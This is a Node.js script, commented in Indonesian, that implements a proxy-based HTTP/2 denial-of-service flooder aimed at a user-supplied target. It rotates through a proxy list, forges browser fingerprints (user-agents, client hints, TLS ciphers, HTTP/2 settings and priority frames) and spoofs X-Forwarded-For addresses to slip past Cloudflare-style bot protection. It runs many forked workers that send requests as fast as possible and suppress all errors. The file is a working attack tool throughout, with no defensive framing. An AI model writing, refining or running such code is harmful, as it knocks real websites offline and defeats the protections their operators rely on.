const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

// --- KONFIGURASI TLS/CRYPTO (Ditingkatkan) ---
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const urihost = [
    'google.com', 'youtube.com', 'facebook.com', 'wikipedia.org',
    'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
];
clength = urihost[Math.floor(Math.random() * urihost.length)]

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[getRandomInt(0, elements.length - 1)];
}
    
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
    const length = getRandomInt(minLength, maxLength);
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = getRandomInt(minLength, maxLength);
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

const cplist = [
    "TLS_AES_128_CCM_8_SHA256", "TLS_AES_128_CCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", 
    "TLS_AES_256_GCM_SHA384", "TLS_AES_128_GCM_SHA256"
];
var cipper = randomElement(cplist);

ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], 
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
     "ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", 
     "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", 
     "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"
] 
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
// Menggunakan secureOptions yang lebih standar (seperti browser modern)
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1; 

if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt `); process.exit();}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
 
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target); 
 
class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address} HTTP/1.1\r\nHost: ${options.address}\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        // Timeout ditingkatkan untuk koneksi lambat
        connection.setTimeout(options.timeout * 3000); 
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true)
        
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.once("data", chunk => { // Gunakan once agar tidak membaca data setelah respons
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server: " + response.split('\r\n')[0]);
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: " + err.code);
        });
    }
}

const Socker = new NetSocket();
 
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const lookupPromise = util.promisify(dns.lookup);
let isp;

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
        }
    } catch (error) {
        // Abaikan error DNS/API
    }
}

const targetURL = parsedTarget.host;

getIPAndISP(targetURL);
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    // Random dari 1GB sampai 5GB
    const min = 1024;
    const max = 5120;
    return getRandomInt(min, max);
}

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + process.argv[2].white);
    console.log(`Time: `.blue + process.argv[3].white);
    console.log(`Rate: `.blue + process.argv[4].white);
    console.log(`Thread: `.blue + process.argv[5].white);
    console.log(`ProxyFile: `.blue + process.argv[6].white);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    runFlooder();
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    function taoDoiTuongNgauNhien() {
        const doiTuang = {};
        const maxi = getRandomInt(1, 3);
        for (let i = 1; i <= maxi; i++) {
            const key = 'cf-sec-' + generateRandomString(1, 9);
            const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
            doiTuang[key] = value;
        }
        return doiTuang;
    }
    
    const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"]; // DuckDuckGo jarang dipakai di mobile
    const getRandomBrowser = () => randomElement(browsers);

    function getRandomPath() {
        const paths = [
            "/",
            "/about", "/products", "/contact", "/news", "/services",
            "/blog/post-" + getRandomInt(100, 1000), 
            "/article/" + getRandomInt(100, 1000),
            "/category/" + getRandomInt(1, 10),
            "/shop/product-" + getRandomInt(100, 500),
            "/portfolio", "/faq", "/support",
            "/store/item-" + getRandomInt(100, 1000),
            "/events/" + getRandomInt(50, 200)
        ];
        // 70% chance to request base path or known path
        return Math.random() < 0.7 ? randomElement(paths) : parsedTarget.path;
    }

    const generateHeaders = (browser) => {
        // --- Versi Konsisten & Data Browser (Lebih Dinamis) ---
        const chromeV = getRandomInt(118, 125);
        const firefoxV = getRandomInt(115, 125);
        const operaV = getRandomInt(95, 105);
        const safariV = getRandomInt(15, 19);

        let ua, secChUa, secChUaMobile, secChUaPlatform, secChUaPlatformVersion, secChUaFullVersionList;

        const os = Math.random() < 0.5 ? `Windows NT ${Math.random() < 0.5 ? '10.0' : '11.0'}; Win64; x64` : "X11; Linux x86_64";
        const platform = os.includes("Windows") ? "Windows" : "Linux";
        const platformVersion = platform === "Windows" ? `"10.0.0"` : `"N/A"`;
        const chromeBuild = `${chromeV}.0.${getRandomInt(4000, 5000)}.${getRandomInt(100, 200)}`;
        
        if (browser === 'chrome' || browser === 'mobile') {
            const mobile = browser === 'mobile' ? "?1" : "?0";
            
            ua = `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeBuild} Safari/537.36`;
            secChUa = `"Not-A.Brand";v="99", "Google Chrome";v="${chromeV}", "Chromium";v="${chromeV}"`;
            secChUaMobile = mobile;
            secChUaPlatform = platform;
            secChUaPlatformVersion = platformVersion;
            secChUaFullVersionList = `"Google Chrome";v="${chromeBuild}", "Chromium";v="${chromeBuild}"`;
        } else if (browser === 'brave') {
            ua = `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeBuild} Safari/537.36 Brave/${getRandomInt(99, 105)}.0.0.0`;
            secChUa = `"Brave";v="${getRandomInt(99, 105)}", "Google Chrome";v="${chromeV}", "Chromium";v="${chromeV}"`;
            secChUaMobile = "?0";
            secChUaPlatform = platform;
            secChUaPlatformVersion = platformVersion;
            secChUaFullVersionList = `"Google Chrome";v="${chromeBuild}", "Chromium";v="${chromeBuild}"`;
        } else if (browser === 'opera' || browser === 'operagx') {
            const browserName = browser === 'opera' ? "Opera" : "Opera GX";
            const gx = browser === 'operagx' ? " GX" : "";
            
            ua = `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeBuild} Safari/537.36 OPR/${operaV}.0.0.0${gx}`;
            secChUa = `"${browserName}";v="${operaV}", "Google Chrome";v="${chromeV}", "Chromium";v="${chromeV}"`;
            secChUaMobile = "?0";
            secChUaPlatform = platform;
            secChUaPlatformVersion = platformVersion;
            secChUaFullVersionList = `"Google Chrome";v="${chromeBuild}", "Chromium";v="${chromeBuild}"`;
        } else if (browser === 'firefox') {
            ua = `Mozilla/5.0 (${os}; rv:${firefoxV}) Gecko/20100101 Firefox/${firefoxV}.0`;
            secChUa = `"Mozilla Firefox";v="${firefoxV}"`;
            secChUaMobile = "?0";
            secChUaPlatform = platform;
            secChUaPlatformVersion = platform === "Windows" ? `"10.0.0"` : `"N/A"`;
            secChUaFullVersionList = `"Mozilla Firefox";v="${firefoxV}"`;
        } else if (browser === 'safari') {
            const safariOS = Math.random() < 0.5 ? "Macintosh; Intel Mac OS X 10_15_7" : "iPhone; CPU iPhone OS 17_0 like Mac OS X";
            const webkit = `${getRandomInt(605, 610)}.${getRandomInt(10, 50)}`;
            
            ua = `Mozilla/5.0 (${safariOS}) AppleWebKit/${webkit} (KHTML, like Gecko) Version/${safariV}.${getRandomInt(0, 5)} Mobile/${getRandomInt(1500, 2000)} Safari/${webkit}`;
            secChUa = `"AppleWebKit";v="${getRandomInt(605, 610)}", "Not-A.Brand";v="99"`;
            secChUaMobile = safariOS.includes("iPhone") ? "?1" : "?0";
            secChUaPlatform = safariOS.includes("iPhone") ? "iOS" : "macOS";
            secChUaPlatformVersion = `"17.0.0"`;
            secChUaFullVersionList = `"Safari";v="${safariV}"`;
        }


        // --- Variasi Header Pendukung (Lebih Dinamis) ---
        const acceptEncoding = Math.random() < 0.6 ? "gzip, deflate, br, zstd" : "gzip, deflate, br";
        const accept = randomElement([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "application/json, text/plain, */*",
            "image/avif,image/webp,*/*",
        ]);

        // Accept Language yang lebih bervariasi
        const acceptLanguage = randomElement([
            "en-US,en;q=0.9", "id-ID,id;q=0.9", "en-GB,en;q=0.9", "es-ES,es;q=0.8,en;q=0.7",
            "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "zh-CN,zh;q=0.8", "*;q=0.8"
        ]);
        
        const referer = randomElement([
            "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", 
            "https://twitter.com/", "https://reddit.com/", "https://" + clength + "/"
        ]);
        const cacheControl = Math.random() < 0.5 ? "max-age=0" : "no-cache";
        
        const requestPath = getRandomPath() + (Math.random() < 0.6 ? "" : "?" + generateRandomString(3) + "=" + generateRandomString(5, 10));

        // Objek Header Dasar
        const headersMap = {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": requestPath,
            
            "sec-ch-ua": secChUa,
            "sec-ch-ua-mobile": secChUaMobile,
            "sec-ch-ua-platform": `"${secChUaPlatform}"`,
            "user-agent": ua,

            "accept": accept,
            "accept-language": acceptLanguage,
            "accept-encoding": acceptEncoding,
            "cache-control": cacheControl,

            "sec-fetch-dest": randomElement(["document", "empty", "image"]),
            "sec-fetch-mode": randomElement(["navigate", "cors", "no-cors"]),
            "sec-fetch-site": randomElement(["same-origin", "cross-site", "none"]),
            
            "referer": referer,
            
            // Client Hint dan Header Opsional
            ...(Math.random() < 0.9 ? { "sec-ch-ua-platform-version": secChUaPlatformVersion } : {}),
            ...(Math.random() < 0.9 ? { "sec-ch-ua-full-version-list": secChUaFullVersionList } : {}),
            ...(Math.random() < 0.7 ? { "sec-fetch-user": "?1" } : {}),
            ...(Math.random() < 0.5 ? { "upgrade-insecure-requests": "1" } : {}),
            ...(Math.random() < 0.3 ? { "dnt": "1" } : {}),
        };
        
        Object.keys(headersMap).forEach(key => headersMap[key] === undefined && delete headersMap[key]);
        return headersMap;
    };

    const headers = generateHeaders(getRandomBrowser());

    const headers4 = {
        ...(Math.random() < 0.5 ? { 'x-forwarded-for': `${getRandomInt(1, 254)}.${getRandomInt(1, 254)}.${getRandomInt(1, 254)}.${getRandomInt(1, 254)}` } : {}),
        ...(Math.random() < 0.7 ?{"referer": "https:/" +clength} :{}),
        ...(Math.random() < 0.7 ?{"origin": "https://" + (Math.random() < 0.5 ? 'www.' : '') + clength}:{}),
    }

    // Gabungkan Header
    let allHeaders = Object.assign({}, headers, headers4);
    
    // Header anomali khusus Cloudflare / Random
    dyn = {
        ...(Math.random() < 0.5 ?{['cf-sec-a'+ generateRandomString(1,9)]: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)} : {}),
    },
    dyn2 = {
        ...(Math.random() < 0.3 ? { "purpose": "prefetch"} : {} ),
        "RTT" : Math.random() < 0.7 ? `${getRandomInt(1, 100)}` : undefined,
    }
    Object.keys(dyn2).forEach(key => dyn2[key] === undefined && delete dyn2[key]);


    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:${parsedPort}`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error) return runFlooder();
        
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: cipper,
            requestCert: true,
            sigalgs: sigalgs,
            socket: connection,
            ecdhCurve: ecdhCurve,
            secureContext: secureContext,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureProtocol: randomElement(['TLSv1.3_method', 'TLSv1.2_method']), // Variasi TLS version
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };
        
        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
        
        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);
        
        function getSettingsBasedOnISP(isp) {
            // Nilai acak yang sangat bervariasi untuk Initial Window Size (Fingerprint H2 Kunci)
            const randomWindowSize = randomElement([15663105, 33554432, 6291456, 65535, getRandomInt(100000, 2000000)]); 

            const defaultSettings = {
                headerTableSize: randomElement([4096, 65536]),
                initialWindowSize: randomWindowSize, 
                maxHeaderListSize: randomElement([262144, 4194304]),
                enablePush: false,
                maxConcurrentStreams: randomElement([100, 1000, getRandomInt(50, 500)]),
                maxFrameSize: 16384,
                enableConnectProtocol: false,
            };
            
            // Jika ISP dikenal, tambahkan sedikit variasi lagi
            if (isp && isp.includes('Cloudflare')) {
                defaultSettings.initialWindowSize = randomElement([65536, 6291456, 1048576]);
            }
            // Variasi acak kecil pada nilai yang sudah ditentukan
            defaultSettings.maxConcurrentStreams = getRandomInt(defaultSettings.maxConcurrentStreams * 0.9, defaultSettings.maxConcurrentStreams * 1.1);

            return defaultSettings;
        }

        let hpack = new HPACK();
        let client;

        try {
            client = http2.connect(parsedTarget.href, {
                protocol: "https",
                createConnection: () => tlsSocket,
                settings : getSettingsBasedOnISP(isp),
                socket: tlsSocket,
            });
        } catch (e) {
            return runFlooder();
        }

        client.setMaxListeners(0);
        
        client.on('connect', () => {
             client.ping((err, duration, payload) => {});
        });
        
        client.on('remoteSettings', (settings) => {
            const windowUpdatePayload = Buffer.alloc(4);
            const randomWindow = getRandomInt(15000000, 25000000); // Window size besar (Chrome)
            windowUpdatePayload.writeUInt32BE(randomWindow, 0);
            client.setLocalWindowSize(randomWindow, 0);
            client.socket.write(encodeFrame(0, http2.constants.FRAME_WINDOW_UPDATE, windowUpdatePayload));
        });

        async function sendRequestsLoop(client, args, endTime) {
            if (client.destroyed || tlsSocket.destroyed || connection.destroyed || Date.now() >= endTime) {
                return runFlooder();
            }

            const shuffleObject = (obj) => {
                const keys = Object.keys(obj);
                for (let i = keys.length - 1; i > 0; i--) {
                    const j = getRandomInt(0, i);
                    [keys[i], keys[j]] = [keys[j], keys[i]];
                }
                const shuffledObj = {};
                keys.forEach(key => shuffledObj[key] = obj[key]);
                return shuffledObj;
            };

            const dynHeaders = shuffleObject({
                ...dyn,
                ...generateHeaders(getRandomBrowser()), 
                ...dyn2,
                ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
            });

            const requestPromises = [];
            let count = 0;
            
            // Loop untuk mengirim RPS target
            for (let i = 0; i < args.Rate; i++) {
                const req = client.request(dynHeaders, {
                    // Bobot acak antara 1 hingga 256 (Meniru prioritas loading resource)
                    weight: getRandomInt(1, 256), 
                    depends_on: 0,
                    exclusive: Math.random() < 0.5,
                });

                requestPromises.push(new Promise((resolve) => {
                    req.on('response', (response) => {
                        req.close(http2.constants.NO_ERROR);
                        req.destroy();
                        resolve();
                    });

                    req.on('error', (err) => {
                        req.destroy();
                        resolve();
                    });
                    
                    req.on('end', () => {
                        resolve();
                    });

                    // Kirim frame PRIORITY tambahan 20% dari waktu
                    if (Math.random() < 0.2) {
                         const priorityPayload = Buffer.alloc(5);
                         priorityPayload.writeUInt32BE(0, 0); 
                         priorityPayload.writeUInt8(getRandomInt(1, 256), 4); 
                         client.socket.write(encodeFrame(req.id, http2.constants.FRAME_PRIORITY, priorityPayload));
                    }

                    req.end();
                }));
            }

            await Promise.allSettled(requestPromises);

            // TIDAK menggunakan delay tetap, tapi menggunakan setImmediate untuk RPS maksimum
            setImmediate(() => sendRequestsLoop(client, args, endTime));
        }

        const endTime = Date.now() + args.time * 1000;
        sendRequestsLoop(client, args, endTime);

        client.on("close", () => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });

        client.on("error", error => {
            client.destroy();
            tlsSocket.destroy();
            connection.destroy();
            return runFlooder();
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});